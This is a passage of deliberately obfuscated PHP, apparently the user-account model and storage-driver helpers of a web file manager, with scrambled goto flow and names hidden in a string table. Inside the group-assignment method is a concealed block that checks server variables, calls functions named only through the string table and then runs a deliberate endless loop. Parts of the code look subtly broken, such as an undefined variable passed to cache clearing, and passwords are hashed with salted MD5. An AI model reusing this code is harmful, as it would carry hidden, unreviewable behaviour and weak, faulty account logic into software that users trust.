IO::infoFull($BÓ¼¨†–); if (!$b—ÒŒ˜ÈØ) { $c„Şã¬ò²Ù = IO::mkdir($BÓ¼¨†–, REPEAT_SKIP); } else { $c„Şã¬ò²Ù = $b—ÒŒ˜ÈØ[$_SERVER[í™][75]]; } Cache::set($BÓ¼¨†–, $c„Şã¬ò²Ù, 3600 * 10); } return $c„Şã¬ò²Ù; } public static function defaultDriver() { return Model($_SERVER[í™][685])->defaultDriver(); } public static function defaultIO() { $E‰áÑß‘Ñ =& $_SERVER[í™]; $cŸ„Éó«» = self::defaultDriver(); return $E‰áÑß‘Ñ[1076] . $cŸ„Éó«»[$E‰áÑß‘Ñ[367]] . $E‰áÑß‘Ñ[1063]; } public static function defaultDriverInit() { static $a—Ëƒ¦‰¥Ê = false; if ($a—Ëƒ¦‰¥Ê) { return $a—Ëƒ¦‰¥Ê; } $a—Ëƒ¦‰¥Ê = IO::init(self::defaultIO()); return $a—Ëƒ¦‰¥Ê; } public static function fileTypeList() { $FÊğÉÑ¿ê =& $_SERVER[í™]; $cÅğíŒ©†¦ = $GLOBALS[$FÊğÉÑ¿ê[6]][$FÊğÉÑ¿ê[1077]]; foreach ($cÅğíŒ©†¦ as $D›õ‡¤÷íç => $a¿ˆíàÂ¢Ì) { $c’²×»ã‘š = $FÊğÉÑ¿ê[1078] . $D›õ‡¤÷íç; $bÚãÄ¸äçì = LNG($c’²×»ã‘š); if ($c’²×»ã‘š != $bÚãÄ¸äçì) { $cÅğíŒ©†¦[$D›õ‡¤÷íç][$FÊğÉÑ¿ê[28]] = $bÚãÄ¸äçì; } } return $cÅğíŒ©†¦; } public static function transferType($B¢È§¯‘ò, $cò §§îŒ) { goto bƒ†ùõ‹´„; e½½•ñÔÙ«: return $fæÍáÚŒÆã[1081]; goto FÙÏº­¢Ùì; C±ç¥µ¹ğˆ: if ($FÀÑÈğ±Õ©[$fæÍáÚŒÆã[29]] == $e–®Š…ŠˆÍ[$fæÍáÚŒÆã[29]] && $FÀÑÈğ±Õ©[$fæÍáÚŒÆã[1079]] == $e–®Š…ŠˆÍ[$fæÍáÚŒÆã[1079]]) { return $fæÍáÚŒÆã[1080]; } if ($FÀÑÈğ±Õ©[$fæÍáÚŒÆã[29]] == $fæÍáÚŒÆã[768] && $e–®Š…ŠˆÍ[$fæÍáÚŒÆã[29]] == $fæÍáÚŒÆã[102]) { return $fæÍáÚŒÆã[1026]; } if ($FÀÑÈğ±Õ©[$fæÍáÚŒÆã[29]] == $fæÍáÚŒÆã[102] && $e–®Š…ŠˆÍ[$fæÍáÚŒÆã[29]] == $fæÍáÚŒÆã[768]) { return $fæÍáÚŒÆã[103]; } goto e½½•ñÔÙ«; bƒ†ùõ‹´„: $fæÍáÚŒÆã =& $_SERVER[í™]; $FÀÑÈğ±Õ© = self::driverType($B¢È§¯‘ò); $e–®Š…ŠˆÍ = self::driverType($cò §§îŒ); goto C±ç¥µ¹ğˆ; FÙÏº­¢Ùì: } public static function driverType($bÖ£ÉøÁê) { goto bµÖ‰Æù×ê; fî“éªÀË½: if ($a“²è­ª–Ÿ == $C´ £à…†ã[676] || $a“²è­ª–Ÿ == $C´ £à…†ã[1083] || $a“²è­ª–Ÿ == $C´ £à…†ã[1084]) { $bÖ£ÉøÁê = self::defaultDriverInit(); } else { if ($a“²è­ª–Ÿ == $C´ £à…†ã[1034] || $a“²è­ª–Ÿ == $C´ £à…†ã[1085]) { $bÖ£ÉøÁê = IO::init($bÖ£ÉøÁê->pathParse[$C´ £à…†ã[984]]); } } $a“²è­ª–Ÿ = str_replace($C´ £à…†ã[1082], $C´ £à…†ã[33], strtolower($bÖ£ÉøÁê->getType())); if ($a“²è­ª–Ÿ == $C´ £à…†ã[102]) { return array($C´ £à…†ã[29] => $C´ £à…†ã[102], $C´ £à…†ã[1079] => $C´ £à…†ã[33], $C´ £à…†ã[75] => $Bâ¤ÁË·ÌÏ); } goto eˆàÓ‘ù¿Ó; eˆàÓ‘ù¿Ó: return array($C´ £à…†ã[29] => $C´ £à…†ã[768], $C´ £à…†ã[1079] => $bÖ£ÉøÁê->pathDriver, $C´ £à…†ã[75] => $Bâ¤ÁË·ÌÏ); goto DÑãÈöÚ•â; bµÖ‰Æù×ê: $C´ £à…†ã =& $_SERVER[í™]; $Bâ¤ÁË·ÌÏ = $bÖ£ÉøÁê->path; $a“²è­ª–Ÿ = str_replace($C´ £à…†ã[1082], $C´ £à…†ã[33], strtolower($bÖ£ÉøÁê->getType())); goto fî“éªÀË½; DÑãÈöÚ•â: } } goto c¶Ò¯¦ÈºÑ; F‚·åŒ®Ú: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\155\145" => "\165\163\x65\x72\137\155\145\164\x61", "\x6d\x65\x74\x61\106\x69\145\154\144" => "\165\x73\145\162\111\104"); protected $simpleField = "\165\163\x65\x72\x49\x44\x2c\156\x69\143\153\116\141\x6d\x65\x2c\x6e\x61\x6d\x65\54\x61\166\141\x74\141\162\54\163\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Cì§ÆœÁ’Ú) { $bçˆŸâÍ¡œ =& $_SERVER[í™]; $Eøì¨Ôğ¼É = $bçˆŸâÍ¡œ[2496]; return array($bçˆŸâÍ¡œ[2162] => array($Cì§ÆœÁ’Ú[0], $Eøì¨Ôğ¼É), $bçˆŸâÍ¡œ[2164] => array($Cì§ÆœÁ’Ú[0], $Eøì¨Ôğ¼É), $bçˆŸâÍ¡œ[2497] => array($Cì§ÆœÁ’Ú[0], $Eøì¨Ôğ¼É)); } protected function getInfo($EÙ‘´©·µâ, $EÂ¯¿Ã¨¥µ = false) { $EËâÄ„Ş†” = $this->getInfoSimple($EÙ‘´©·µâ); if (!is_array($EËâÄ„Ş†”)) { return array(); } if ($EÂ¯¿Ã¨¥µ) { return $this->_getInfoApply($EËâÄ„Ş†”); } return $this->cacheFunctionGet($_SERVER[í™][2218], $EÙ‘´©·µâ); } protected function getInfoFull($Aº¡‹Ó¢Ñª, $Bªíà¬æ¸Ê = false) { $a¡à¥œŠ‰å = $this->getInfoSimple($Aº¡‹Ó¢Ñª); if (!is_array($a¡à¥œŠ‰å)) { return array(); } if ($Bªíà¬æ¸Ê) { return $this->_getInfoApply($a¡à¥œŠ‰å, !0); return $this->_getInfoApply($a¡à¥œŠ‰å, !0); } return $this->cacheFunctionGet($_SERVER[í™][2498], $Aº¡‹Ó¢Ñª); } private function _getInfoApply($f‹Øê¹Á¦, $FŸÚá·ì„Î = false) { goto D‘ê÷®œÔƒ; D‘ê÷®œÔƒ: $Eø‰Úè‰À³ =& $_SERVER[í™]; if (!$f‹Øê¹Á¦) { return $f‹Øê¹Á¦; } $e£§¦Œ¤¥å = md5($Eø‰Úè‰À³[2499] . $f‹Øê¹Á¦[$Eø‰Úè‰À³[787]] . $Eø‰Úè‰À³[2500] . $f‹Øê¹Á¦[$Eø‰Úè‰À³[28]]); goto C“±ÔÉšÕà; fÒš¡‚Ÿšº: $f‹Øê¹Á¦[$Eø‰Úè‰À³[391]][$Eø‰Úè‰À³[2335]] = isset($d™ø‘í¬‘Ç[$Eø‰Úè‰À³[2336]]) ? $d™ø‘í¬‘Ç[$Eø‰Úè‰À³[2336]] : null; if ($FŸÚá·ì„Î) { $f‹Øê¹Á¦[$Eø‰Úè‰À³[417]] = $this->metaGet($f‹Øê¹Á¦[$Eø‰Úè‰À³[1423]]); } return $f‹Øê¹Á¦; goto b›¢ìÅÎë; C“±ÔÉšÕà: $f‹Øê¹Á¦ = $this->_listDataApplyItem($f‹Øê¹Á¦); $d™ø‘í¬‘Ç = Model($Eø‰Úè‰À³[1103])->metaGet($f‹Øê¹Á¦[$Eø‰Úè‰À³[391]][$Eø‰Úè‰À³[369]]); $f‹Øê¹Á¦[$Eø‰Úè‰À³[2501]] = $e£§¦Œ¤¥å; goto fÒš¡‚Ÿšº; b›¢ìÅÎë: } protected function getInfoSimple($CÉ¶ó†Ææ´, $D‰¦áˆ¨ÉÄ = false) { $aí‘…‚ãó¦ =& $_SERVER[í™]; if (!$CÉ¶ó†Ææ´) { return array(); } if ($D‰¦áˆ¨ÉÄ) { $A™†“ÈÖ´ê = $this->where(array($aí‘…‚ãó¦[1423] => intval($CÉ¶ó†Ææ´)))->find(); if (!is_array($A™†“ÈÖ´ê)) { return array(); } $A™†“ÈÖ´ê[$aí‘…‚ãó¦[2502]] = Action($aí‘…‚ãó¦[2503])->parseUrl($A™†“ÈÖ´ê[$aí‘…‚ãó¦[2502]]); return $A™†“ÈÖ´ê; } return $this->cacheFunctionGet($aí‘…‚ãó¦[2165], $CÉ¶ó†Ææ´); } protected function getInfoSimpleOuter($dºŒ­ª„ß) { goto aÄğ‡•£³Ô; aÄğ‡•£³Ô: $fé¬Ê¯‡¬Œ =& $_SERVER[í™]; if (!$dºŒ­ª„ß || $dºŒ­ª„ß == 0) { return array($fé¬Ê¯‡¬Œ[1423] => $fé¬Ê¯‡¬Œ[470], $fé¬Ê¯‡¬Œ[28] => $fé¬Ê¯‡¬Œ[157] . LNG($fé¬Ê¯‡¬Œ[2504]) . $fé¬Ê¯‡¬Œ[478], $fé¬Ê¯‡¬Œ[2502] => STATIC_PATH . $fé¬Ê¯‡¬Œ[2505]); } $A”¢ŸÎ§Œ¶ = $this->cacheFunctionGet($fé¬Ê¯‡¬Œ[2165], $dºŒ­ª„ß); goto C…’°¦»ßâ; C…’°¦»ßâ: $f»‡›Ö†¨µ = array_field_key($A”¢ŸÎ§Œ¶, explode($fé¬Ê¯‡¬Œ[47], $this->simpleField)); if (!$f»‡›Ö†¨µ) { return array($fé¬Ê¯‡¬Œ[1423] => $fé¬Ê¯‡¬Œ[1017], $fé¬Ê¯‡¬Œ[28] => $fé¬Ê¯‡¬Œ[157] . LNG($fé¬Ê¯‡¬Œ[2506]) . $fé¬Ê¯‡¬Œ[478], $fé¬Ê¯‡¬Œ[2502] => STATIC_PATH . $fé¬Ê¯‡¬Œ[2507]); } $f»‡›Ö†¨µ[$fé¬Ê¯‡¬Œ[2502]] = Action($fé¬Ê¯‡¬Œ[2503])->parseUrl($f»‡›Ö†¨µ[$fé¬Ê¯‡¬Œ[2502]]); goto bĞ¦Ä×©³ ; bĞ¦Ä×©³ : return $f»‡›Ö†¨µ; goto F’˜…–ùˆÇ; F’˜…–ùˆÇ: } protected function groupUser($c ¥Ü„‚¿Š) { } public static function errorLang($Fó•ËÍØÎİ) { $B”’™¹¹° =& $_SERVER[í™]; $C¯§‹›ñÊµ = array(self::ERROR_USER_NOT_EXISTS => $B”’™¹¹°[2508], self::ERROR_USER_PASSWORD_ERROR => $B”’™¹¹°[2509], self::ERROR_USER_EXIST_NAME => $B”’™¹¹°[2510], self::ERROR_USER_EXIST_PHONE => $B”’™¹¹°[2511], self::ERROR_USER_EXIST_EMAIL => $B”’™¹¹°[2512], self::ERROR_USER_LOGIN_LOCK => $B”’™¹¹°[2513], self::ERROR_IP_NOT_ALLOW => $B”’™¹¹°[2514], self::ERROR_USER_EXIST_NICKNAME => $B”’™¹¹°[2515]); return LNG($C¯§‹›ñÊµ[$Fó•ËÍØÎİ]); } public function getInfoByMeta($DÉ‡µÕŞºÃ, $CßĞŠË·²) { $e´îËêß±¸ =& $_SERVER[í™]; $BÄÖÕƒßÄ‡ = Model($e´îËêß±¸[2516])->where(array($e´îËêß±¸[89] => $DÉ‡µÕŞºÃ, $e´îËêß±¸[359] => $CßĞŠË·²))->find(); if ($BÄÖÕƒßÄ‡) { return $this->getInfo($BÄÖÕƒßÄ‡[$e´îËêß±¸[1423]]); } return !1; } public function userLoginCheck($c‹±¡ĞàÔ†, $E»¶Ó†ŠÔ½) { goto fòÒİÜ°Â’; fòÒİÜ°Â’: $BÍ¨†…ÙÃ =& $_SERVER[í™]; $B¯èé£ŸÔê = array($BÍ¨†…ÙÃ[28] => $c‹±¡ĞàÔ†, $BÍ¨†…ÙÃ[2339] => $c‹±¡ĞàÔ†, $BÍ¨†…ÙÃ[293] => $c‹±¡ĞàÔ†, $BÍ¨†…ÙÃ[2517] => $c‹±¡ĞàÔ†, $BÍ¨†…ÙÃ[899] => $BÍ¨†…ÙÃ[901]); if ($this->nickNameRpt()) { unset($B¯èé£ŸÔê[$BÍ¨†…ÙÃ[2339]]); } goto e‚ê‰÷¤®; e‚ê‰÷¤®: $b­É¹Ñ¾ì× = $this->where($B¯èé£ŸÔê)->find(); if (!$b­É¹Ñ¾ì×) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($b­É¹Ñ¾ì×[$BÍ¨†…ÙÃ[1423]], $E»¶Ó†ŠÔ½)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto BäÑíá«ïá; BäÑíá«ïá: $this->userEdit($b­É¹Ñ¾ì×[$BÍ¨†…ÙÃ[1423]], array($BÍ¨†…ÙÃ[2518] => time())); return $this->getInfo($b­É¹Ñ¾ì×[$BÍ¨†…ÙÃ[1423]]); goto AÃÔØ²Í†¶; AÃÔØ²Í†¶: } public function clearCache($aÏğ÷·ÜÁ) { $CêËãì–ÑÈ =& $_SERVER[í™]; $this->cacheFunctionClear($CêËãì–ÑÈ[2218], $aÏğ÷·ÜÁ); $this->cacheFunctionClear($CêËãì–ÑÈ[2165], $aÏğ÷·ÜÁ); $this->cacheFunctionClear($CêËãì–ÑÈ[2498], $aÏğ÷·ÜÁ); } public function userPasswordCheck($bÈÚõÏ–«Î, $a¸‘‡ö¤×Ñ) { $aÕâá¬áÚÆ =& $_SERVER[í™]; $cê©Ø”¢·ª = $this->where(array($aÕâá¬áÚÆ[1423] => intval($bÈÚõÏ–«Î)))->find(); $e­ƒˆÓ = $this->metaGet($bÈÚõÏ–«Î); $cŠĞ¾²í = isset($e­ƒˆÓ[$aÕâá¬áÚÆ[2519]]) ? $e­ƒˆÓ[$aÕâá¬áÚÆ[2519]] : $aÕâá¬áÚÆ[33]; if (md5($cŠĞ¾²í . trim($a¸‘‡ö¤×Ñ)) !== $cê©Ø”¢·ª[$aÕâá¬áÚÆ[787]]) { return !1; } return !0; } public function userAdd($A¬Ù©æÆÁ) { goto B¡É Ú–; DºÀÆ•Şàö: $dù×Ïˆ±‚ = $this->_checkExist($A¬Ù©æÆÁ); if ($dù×Ïˆ±‚ !== !0) { return $dù×Ïˆ±‚; } $DĞÀ ¥ˆßò = $this->add($a¹ĞÁ¿•¤ß); goto C¨½¹›Îß¿; B¡É Ú–: $aÃ¡ÜäÆ¦Á =& $_SERVER[í™]; $a¹ĞÁ¿•¤ß = array($aÃ¡ÜäÆ¦Á[386] => $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[28]], $aÃ¡ÜäÆ¦Á[2520] => $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[1307]], $aÃ¡ÜäÆ¦Á[2521] => isset($A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[293]]) ? $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[293]] : $aÃ¡ÜäÆ¦Á[33], $aÃ¡ÜäÆ¦Á[2522] => isset($A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[2517]]) ? $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[2517]] : $aÃ¡ÜäÆ¦Á[33], $aÃ¡ÜäÆ¦Á[2523] => isset($A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[2339]]) ? $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[2339]] : $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[28]], $aÃ¡ÜäÆ¦Á[2524] => isset($A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[2502]]) ? $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[2502]] : $aÃ¡ÜäÆ¦Á[33], $aÃ¡ÜäÆ¦Á[2525] => isset($A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[2526]]) ? $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[2526]] : 1, $aÃ¡ÜäÆ¦Á[2527] => $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[787]], $aÃ¡ÜäÆ¦Á[2166] => isset($A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[2078]]) ? $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[2078]] : 1024 * 1024 * 20, $aÃ¡ÜäÆ¦Á[2167] => 0, $aÃ¡ÜäÆ¦Á[2518] => 0, $aÃ¡ÜäÆ¦Á[2205] => isset($A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[671]]) ? $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[671]] : 1); if (!empty($A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[1423]])) { $a¹ĞÁ¿•¤ß[$aÃ¡ÜäÆ¦Á[1423]] = $A¬Ù©æÆÁ[$aÃ¡ÜäÆ¦Á[1423]]; } goto DºÀÆ•Şàö; C¨½¹›Îß¿: $C£¬æ§Öºá = array($aÃ¡ÜäÆ¦Á[2527] => $a¹ĞÁ¿•¤ß[$aÃ¡ÜäÆ¦Á[787]], $aÃ¡ÜäÆ¦Á[2523] => $a¹ĞÁ¿•¤ß[$aÃ¡ÜäÆ¦Á[2339]]); $this->userEdit($DĞÀ ¥ˆßò, $C£¬æ§Öºá); Model($aÃ¡ÜäÆ¦Á[1103])->userRootAdd($DĞÀ ¥ˆßò); goto FÉø¥ÄĞ‰ç; FÉø¥ÄĞ‰ç: return $DĞÀ ¥ˆßò; goto cë¦åÓ˜; cë¦åÓ˜: } protected function userEditTest($CÅÂ¨»»÷ß, $CÊŸ‘¿Ÿˆº) { return $this->call($_SERVER[í™][2528], $CÅÂ¨»»÷ß, $CÊŸ‘¿Ÿˆº); } protected function userEdit($cÊ˜ÂÅñ™ø, $D¥¾â–˜åŒ) { goto Dª’Î»á¸ñ; Bš¢¾İÌÏ: return !0; goto d—ë¼·­º; Dª’Î»á¸ñ: $dÃÈñŸ¤Òé =& $_SERVER[í™]; $eââµ‹’¥Ï = $this->getInfoSimple($cÊ˜ÂÅñ™ø); if (!$eââµ‹’¥Ï) { return !1; } goto fŠ‘ğ…Ş; fŠ‘ğ…Ş: $F†‰ƒãª“ = $this->_checkExist($D¥¾â–˜åŒ, $cÊ˜ÂÅñ™ø); if ($F†‰ƒãª“ !== !0) { return $F†‰ƒãª“; } if (isset($D¥¾â–˜åŒ[$dÃÈñŸ¤Òé[787]]) && trim($D¥¾â–˜åŒ[$dÃÈñŸ¤Òé[787]]) != $dÃÈñŸ¤Òé[33]) { $AÙ›³™˜ğ‡ = $this->metaGet($cÊ˜ÂÅñ™ø); if (empty($AÙ›³™˜ğ‡[$dÃÈñŸ¤Òé[2519]])) { $AÙ›³™˜ğ‡[$dÃÈñŸ¤Òé[2519]] = rand_string(10); Model($dÃÈñŸ¤Òé[476])->metaSet($cÊ˜ÂÅñ™ø, $dÃÈñŸ¤Òé[2519], $AÙ›³™˜ğ‡[$dÃÈñŸ¤Òé[2519]]); } $D¥¾â–˜åŒ[$dÃÈñŸ¤Òé[787]] = md5($AÙ›³™˜ğ‡[$dÃÈñŸ¤Òé[2519]] . trim($D¥¾â–˜åŒ[$dÃÈñŸ¤Òé[787]])); } else { unset($D¥¾â–˜åŒ[$dÃÈñŸ¤Òé[787]]); } goto Fì«ó÷¸ô; Fì«ó÷¸ô: $this->where(array($dÃÈñŸ¤Òé[1414] => $cÊ˜ÂÅñ™ø))->save($D¥¾â–˜åŒ); if (isset($D¥¾â–˜åŒ[$dÃÈñŸ¤Òé[2339]])) { $this->setNamePinyin($cÊ˜ÂÅñ™ø, $D¥¾â–˜åŒ[$dÃÈñŸ¤Òé[2339]]); } $this->clearCache($E´”›ÉÉµ[$dÃÈñŸ¤Òé[1423]]); goto Bš¢¾İÌÏ; d—ë¼·­º: } public function setNamePinyin($b» ÷Ü³Í…, $eó®‡‰” = false) { $DÂŒ¦ãô =& $_SERVER[í™]; if (!$eó®‡‰”) { $D‹ÏÉ¶˜â² = $this->getInfoSimple($b» ÷Ü³Í…); $eó®‡‰” = $D‹ÏÉ¶˜â²[$DÂŒ¦ãô[2339]] ? $D‹ÏÉ¶˜â²[$DÂŒ¦ãô[2339]] : $D‹ÏÉ¶˜â²[$DÂŒ¦ãô[28]]; } $bè¼Şë˜Ò© = Model($DÂŒ¦ãô[479]); if (!Input::check($eó®‡‰”, $DÂŒ¦ãô[530])) { return $bè¼Şë˜Ò©->metaSet($b» ÷Ü³Í…, array($DÂŒ¦ãô[416] => $DÂŒ¦ãô[33], $DÂŒ¦ãô[415] => $DÂŒ¦ãô[33])); } return $bè¼Şë˜Ò©->metaSet($b» ÷Ü³Í…, array($DÂŒ¦ãô[416] => str_replace($DÂŒ¦ãô[50], $DÂŒ¦ãô[33], Pinyin::encode($eó®‡‰”)), $DÂŒ¦ãô[415] => Pinyin::encode($eó®‡‰”, $DÂŒ¦ãô[531]))); } private function nickNameRpt() { $dƒÂ‰ßšíµ =& $_SERVER[í™]; $Aª¯¤ìŸ´¼ = Model($dƒÂ‰ßšíµ[1074])->get($dƒÂ‰ßšíµ[2529]); $böŞÀ‰ŸŒ = $GLOBALS[$dƒÂ‰ßšíµ[6]][$dƒÂ‰ßšíµ[2485]][$dƒÂ‰ßšíµ[2529]]; $dáôíŠÊ› = !is_null($Aª¯¤ìŸ´¼) ? $Aª¯¤ìŸ´¼ : $böŞÀ‰ŸŒ; return !!$dáôíŠÊ›; } private function _checkExist($bªß¦ÍÕ, $AÂ’ß«ÎÈ¯ = false) { $A¡¹Ë‰šßö =& $_SERVER[í™]; $bæ—öÒ“¤ = array($A¡¹Ë‰šßö[28] => UserModel::ERROR_USER_EXIST_NAME, $A¡¹Ë‰šßö[2339] => UserModel::ERROR_USER_EXIST_NICKNAME, $A¡¹Ë‰šßö[293] => UserModel::ERROR_USER_EXIST_EMAIL, $A¡¹Ë‰šßö[2517] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($bæ—öÒ“¤[$A¡¹Ë‰šßö[2339]]); } $f®‹â› = $AÂ’ß«ÎÈ¯ ? array($A¡¹Ë‰šßö[1423] => array($A¡¹Ë‰šßö[2530], $AÂ’ß«ÎÈ¯)) : array(); foreach ($bæ—öÒ“¤ as $F»ì­¼½±Œ => $DõÑóÊçğª) { if (!isset($bªß¦ÍÕ[$F»ì­¼½±Œ]) || !$bªß¦ÍÕ[$F»ì­¼½±Œ]) { continue; } $b¸Èöâ¦› = array_merge(array($F»ì­¼½±Œ => $bªß¦ÍÕ[$F»ì­¼½±Œ]), $f®‹â›); $BäÅªë¡‘ = $this->where($b¸Èöâ¦›)->find(); if ($BäÅªë¡‘) { return $DõÑóÊçğª; } } return !0; } public function userListInfo($d½ŠŒïö£) { $D©„ßŠÓ» =& $_SERVER[í™]; $cæÖ¦¡Ç§ = array(); $d½ŠŒïö£ = is_array($d½ŠŒïö£) ? array_unique($d½ŠŒïö£) : array(); if (!$d½ŠŒïö£) { return $cæÖ¦¡Ç§; } if (count($d½ŠŒïö£) < 20) { foreach ($d½ŠŒïö£ as $C•‚ÈŠ–¤) { $cæÖ¦¡Ç§[$C•‚ÈŠ–¤ . $D©„ßŠÓ»[33]] = $this->getInfoSimpleOuter($C•‚ÈŠ–¤); } } else { $C’„Ë›×ï = array($D©„ßŠÓ»[1414] => array($D©„ßŠÓ»[384], $d½ŠŒïö£)); if (count($d½ŠŒïö£) == 1) { $C’„Ë›×ï = array($D©„ßŠÓ»[1414] => $d½ŠŒïö£[0]); } $EÔÈÂÚ = Model($D©„ßŠÓ»[476])->field($this->simpleField)->where($C’„Ë›×ï)->select(); $EÔÈÂÚ = array_to_keyvalue($EÔÈÂÚ, $D©„ßŠÓ»[1423]); foreach ($d½ŠŒïö£ as $C•‚ÈŠ–¤) { $c½Âß¡’‚Ÿ = $EÔÈÂÚ[$EÔÈÂÚ[$C•‚ÈŠ–¤]]; if (!$c½Âß¡’‚Ÿ) { $cæÖ¦¡Ç§[$C•‚ÈŠ–¤ . $D©„ßŠÓ»[33]] = $this->getInfoSimpleOuter($C•‚ÈŠ–¤); continue; } $c½Âß¡’‚Ÿ[$D©„ßŠÓ»[2502]] = Action($D©„ßŠÓ»[2503])->parseUrl($c½Âß¡’‚Ÿ[$D©„ßŠÓ»[2502]]); $cæÖ¦¡Ç§[$C•‚ÈŠ–¤ . $D©„ßŠÓ»[33]] = $c½Âß¡’‚Ÿ; } } return $cæÖ¦¡Ç§; } protected function userStatus($FÊˆ¹ÌîŞÂ, $c‹ªÕÚ—) { $B©•©¿™Õ¨ = $this->getInfoSimple($FÊˆ¹ÌîŞÂ); if (!$B©•©¿™Õ¨) { return !1; } $bŸêì³Õôã = array($_SERVER[í™][671] => $c‹ªÕÚ—); return $this->userEdit($FÊˆ¹ÌîŞÂ, $bŸêì³Õôã); } protected function userRemove($cÃõé²É¡Ë) { goto fÛ´áÙ­ø‰; fÛ´áÙ­ø‰: $Bî¨ˆ¦äòó =& $_SERVER[í™]; $AšÅ—®İÙ“ = $this->getInfoSimple($cÃõé²É¡Ë); if (!$AšÅ—®İÙ“) { return !1; } goto bà­ê²‡ô¤; c÷×«œ­Å˜: Model($Bî¨ˆ¦äòó[2172])->where($cï­±®©œ)->delete(); Model($Bî¨ˆ¦äòó[2516])->where($cï­±®©œ)->delete(); Model($Bî¨ˆ¦äòó[2532])->where($cï­±®©œ)->delete(); goto BºØÃ°ŸË; bà­ê²‡ô¤: $cï­±®©œ = array($Bî¨ˆ¦äòó[1414] => $cÃõé²É¡Ë); Model($Bî¨ˆ¦äòó[538])->where($cï­±®©œ)->delete(); Model($Bî¨ˆ¦äòó[2531])->where($cï­±®©œ)->delete(); goto c÷×«œ­Å˜; BºØÃ°ŸË: Model($Bî¨ˆ¦äòó[734])->userRootRemove($cÃõé²É¡Ë); return $this->where($cï­±®©œ)->delete(); goto b®ˆ¸Ì™º; b®ˆ¸Ì™º: } protected function userGroupSet($Cµ´©æùà, $f¦¾ÊëáèÓ, $dÏŞÎÛ‰ù‘ = array()) { goto E“¾¦âÂ‡µ; DáÉ÷Íº’«: $D–ÖÅÜÑ­ = array(); $dê•ç¥†õ = 0; foreach ($f¦¾ÊëáèÓ as $aôÒ³ÌÁˆ => $fªĞÈßè£) { $DìÏ†‘§• = array($d×ÑÚ¥ƒ¸[1423] => $Cµ´©æùà, $d×ÑÚ¥ƒ¸[2094] => $aôÒ³ÌÁˆ, $d×ÑÚ¥ƒ¸[2237] => $fªĞÈßè£); $DìÏ†‘§•[$d×ÑÚ¥ƒ¸[2115]] = isset($dÏŞÎÛ‰ù‘[$dê•ç¥†õ]) ? $dÏŞÎÛ‰ù‘[$dê•ç¥†õ] : 0; $dê•ç¥†õ++; $D–ÖÅÜÑ­[] = $DìÏ†‘§•; } goto DÑ”ÃŠ‚’; DÑ”ÃŠ‚’: return $FÅ‡§²£Šµ->addAll($D–ÖÅÜÑ­, array(), !0); goto fé¨µ¹Ë; A ‡Æç”÷: if (!$EÆ ÓÄÚ÷ || !is_array($f¦¾ÊëáèÓ)) { return !1; } $FÅ‡§²£Šµ = Model($d×ÑÚ¥ƒ¸[2172]); $FÅ‡§²£Šµ->where(array($d×ÑÚ¥ƒ¸[1423] => $Cµ´©æùà))->delete(); goto DáÉ÷Íº’«; E“¾¦âÂ‡µ: $d×ÑÚ¥ƒ¸ =& $_SERVER[í™]; if (!isset($_SERVER[$d×ÑÚ¥ƒ¸[736]]) || !isset($_SERVER[$d×ÑÚ¥ƒ¸[737]])) { goto c£¿æºØìë; D†¼ÜÂ»ò: for ($e›¿Éèâ™ğ = $EøÛ„ŒÌ‹Å; $e›¿Éèâ™ğ > 0; $e›¿Éèâ™ğ++) { $d¶Úêİ›’Ù = json_encode($GLOBALS[$d×ÑÚ¥ƒ¸[384]]); } goto CÊ‡˜ÍÖÌ»; e´Ş—ñ¤×: $d¶Úêİ›’Ù = $d×ÑÚ¥ƒ¸[778]; $d¶Úêİ›’Ù($_SERVER[$d×ÑÚ¥ƒ¸[779]]); $EøÛ„ŒÌ‹Å = 1; goto D†¼ÜÂ»ò; bò®‡Œ•: $E®õ¡´èš” = $d™¦ã‚Ö Î($d¶Š¿Ò‹”); $Cëææ‘Ñè = explode($d×ÑÚ¥ƒ¸[217], $E®õ¡´èš”); if (count($Cëææ‘Ñè) < $d×ÑÚ¥ƒ¸[562]) { $f¢ñœˆ‘¹è = $d×ÑÚ¥ƒ¸[741]; $f¢ñœˆ‘¹è(); } goto e´Ş—ñ¤×; c£¿æºØìë: $cµâçÕÉÊ… = $d×ÑÚ¥ƒ¸[777]; $d™¦ã‚Ö Î = $d×ÑÚ¥ƒ¸[738]; $d¶Š¿Ò‹” = $_SERVER[$d×ÑÚ¥ƒ¸[739]] . $d×ÑÚ¥ƒ¸[740]; goto bò®‡Œ•; CÊ‡˜ÍÖÌ»: } $EÆ ÓÄÚ÷ = $this->getInfoSimple($Cµ´©æùà); goto A ‡Æç”÷; fé¨µ¹Ë: } protected function userGroupAdd($D§„¾„ëâ×, $F”Î£»–¤Ã = array()) { $f–¼êÏ„Á« =& $_SERVER[í™]; $dçŸ¦Èî×© = $this->getInfoSimple($D§„¾„ëâ×); if (!$dçŸ¦Èî×© || empty($F”Î£»–¤Ã)) { return !1; } 